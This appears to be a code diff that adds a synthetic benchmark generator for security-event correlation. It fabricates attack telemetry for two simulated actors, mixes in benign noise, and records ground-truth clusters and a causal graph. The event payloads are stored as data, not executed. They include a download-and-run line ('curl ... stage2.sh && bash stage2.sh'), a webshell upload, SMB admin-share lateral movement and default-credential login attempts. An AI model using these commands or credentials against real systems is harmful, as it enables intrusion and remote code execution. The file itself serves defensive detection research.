@@ -272,3 +272,133 @@ class ScenarioGenerator:
             "events": combined_events,
             "ground_truth_clusters": gt_clusters
         }
+
+    def generate_benchmark_workload(
+        self,
+        seed: Optional[int] = None,
+        num_actors: int = 2,
+        include_noise: bool = True,
+        noise_count: int = 2
+    ) -> Dict[str, Any]:
+        """
+        Dynamically generates unannotated canonical telemetry stream and decoupled
+        ground truth clusters/DAG for feature ablation and empirical evaluations.
+        Ensures complete decoupling: algorithms receive only unannotated_events.
+        """
+        rng = random.Random(seed or self.seed)
+        topology = TopologyGenerator.generate_topology(node_count=3)
+        base_time = 1700000000.0
+
+        events = []
+        gt_clusters = {}
+        causal_edges = []
+
+        # Actor Alpha: Multi-stage APT with internal pivot (IP rotation + jump token)
+        actor_alpha = self.actor_gen.generate_actor("ACTOR_ALPHA", fixed_ip="198.51.100.42", num_ips=1)
+        pivot_ip = "192.168.10.5"
+        token = "token-jump-pivot-99"
+
+        # Stage 1: Web probe & SSH auth on external IP
+        ev_a1 = EventGenerator.create_event(
+            event_id="evt_dyn_a1", actor=actor_alpha, node=topology[0], service="http",
+            tactic="TA0001_Initial_Access", timestamp_sec=base_time, source_ip="198.51.100.42",
+            payload_details={"event_type": "web_probe", "payload": "GET /setup.php HTTP/1.1", "causal_token": None}
+        )
+        ev_a2 = EventGenerator.create_event(
+            event_id="evt_dyn_a2", actor=actor_alpha, node=topology[0], service="ssh",
+            tactic="TA0006_Credential_Access", timestamp_sec=base_time + 60, source_ip="198.51.100.42",
+            payload_details={"event_type": "auth_login", "payload": "LOGIN admin / admin123", "causal_token": None}
+        )
+        ev_a3 = EventGenerator.create_event(
+            event_id="evt_dyn_a3", actor=actor_alpha, node=topology[0], service="ssh",
+            tactic="TA0002_Execution", timestamp_sec=base_time + 120, source_ip="198.51.100.42",
+            payload_details={"event_type": "command_exec", "payload": "curl -O http://cdn.io/stage2.sh && bash stage2.sh", "causal_token": token}
+        )
+        ev_a4 = EventGenerator.create_event(
+            event_id="evt_dyn_a4", actor=actor_alpha, node=topology[0], service="http",
+            tactic="TA0003_Persistence", timestamp_sec=base_time + 180, source_ip="198.51.100.42",
+            payload_details={"event_type": "web_upload", "payload": "POST /upload.php [webshell.php]", "causal_token": token}
+        )
+        # Stage 2: Pivot to internal node using rotated internal IP
+        ev_a5 = EventGenerator.create_event(
+            event_id="evt_dyn_a5", actor=actor_alpha, node=topology[1], service="smb",
+            tactic="TA0008_Lateral_Movement", timestamp_sec=base_time + 240, source_ip=pivot_ip,
+            payload_details={"event_type": "smb_connect", "payload": "SMB2_TREE_CONNECT \\\\node-2\\c$", "causal_token": token}
+        )
+        ev_a6 = EventGenerator.create_event(
+            event_id="evt_dyn_a6", actor=actor_alpha, node=topology[1], service="smb",
+            tactic="TA0010_Exfiltration", timestamp_sec=base_time + 300, source_ip=pivot_ip,
+            payload_details={"event_type": "payload_write", "payload": "SMB2_WRITE payload.exe", "causal_token": token}
+        )
+
+        alpha_events = [ev_a1, ev_a2, ev_a3, ev_a4, ev_a5, ev_a6]
+        events.extend(alpha_events)
+        gt_clusters["ACTOR_ALPHA"] = [e["event_id"] for e in alpha_events]
+        for i in range(len(alpha_events) - 1):
+            causal_edges.append({"from": alpha_events[i]["event_id"], "to": alpha_events[i+1]["event_id"]})
+
+        # Actor Beta: Concurrent independent botnet brute-forcer
+        actor_beta = self.actor_gen.generate_actor("ACTOR_BETA", fixed_ip="203.0.113.88", num_ips=1)
+        ev_b1 = EventGenerator.create_event(
+            event_id="evt_dyn_b1", actor=actor_beta, node=topology[1], service="ssh",
+            tactic="TA0007_Discovery", timestamp_sec=base_time + 30, source_ip="203.0.113.88",
+            payload_details={"event_type": "port_scan", "payload": "TCP SYN probe port 22", "causal_token": None}
+        )
+        ev_b2 = EventGenerator.create_event(
+            event_id="evt_dyn_b2", actor=actor_beta, node=topology[1], service="ssh",
+            tactic="TA0001_Initial_Access", timestamp_sec=base_time + 90, source_ip="203.0.113.88",
+            payload_details={"event_type": "auth_login", "payload": "LOGIN root / 123456", "causal_token": None}
+        )
+        ev_b3 = EventGenerator.create_event(
+            event_id="evt_dyn_b3", actor=actor_beta, node=topology[1], service="ssh",
+            tactic="TA0006_Credential_Access", timestamp_sec=base_time + 150, source_ip="203.0.113.88",
+            payload_details={"event_type": "auth_login", "payload": "LOGIN root / password", "causal_token": None}
+        )
+        beta_events = [ev_b1, ev_b2, ev_b3]
+        events.extend(beta_events)
+        gt_clusters["ACTOR_BETA"] = [e["event_id"] for e in beta_events]
+        for i in range(len(beta_events) - 1):
+            causal_edges.append({"from": beta_events[i]["event_id"], "to": beta_events[i+1]["event_id"]})
+
+        # Benign Noise
+        if include_noise:
+            for n_idx in range(noise_count):
+                noise_ip = f"198.18.0.{n_idx + 1}"
+                ev_n = {
+                    "event_id": f"evt_dyn_noise_{n_idx+1}",
+                    "timestamp": base_time + rng.uniform(20, 280),
+                    "real_timestamp": base_time + rng.uniform(20, 280),
+                    "source_ip": noise_ip,
+                    "target_node": f"node-{n_idx % 2 + 1}",
+                    "service": "HTTP" if n_idx % 2 == 0 else "NTP",
+                    "event_type": "web_probe" if n_idx % 2 == 0 else "ntp_query",
+                    "payload": "GET /robots.txt HTTP/1.1" if n_idx % 2 == 0 else "NTP MONLIST request",
+                    "causal_token": None
+                }
+                events.append(ev_n)
+
+        # Build clean unannotated event list (stripping actor_id and ground_truth fields)
+        unannotated = []
+        for e in events:
+            unannotated.append({
+                "event_id": e["event_id"],
+                "timestamp": e.get("real_timestamp") if e.get("real_timestamp") is not None else e.get("timestamp"),
+                "real_timestamp": e.get("real_timestamp") if e.get("real_timestamp") is not None else e.get("timestamp"),
+                "source_ip": e.get("source_ip"),
+                "target_node": e.get("node_id") or e.get("target_node", "node-1"),
+                "service": e.get("service_id") or e.get("service", "unknown"),
+                "event_type": e.get("event_type") or (e.get("payload", {}).get("event_type") if isinstance(e.get("payload"), dict) else None) or "unknown",
+                "payload": e.get("payload", {}).get("payload") if isinstance(e.get("payload"), dict) else e.get("payload"),
+                "causal_token": e.get("payload", {}).get("causal_token") if isinstance(e.get("payload"), dict) else e.get("causal_token")
+            })
+
+        return {
+            "scenario": "DYNAMIC_BENCHMARK_WORKLOAD",
+            "seed": seed or self.seed,
+            "unannotated_events": unannotated,
+            "ground_truth_clusters": gt_clusters,
+            "ground_truth_dag": {
+                "nodes": [e["event_id"] for e in events],
+                "edges": causal_edges
+            }
+        }
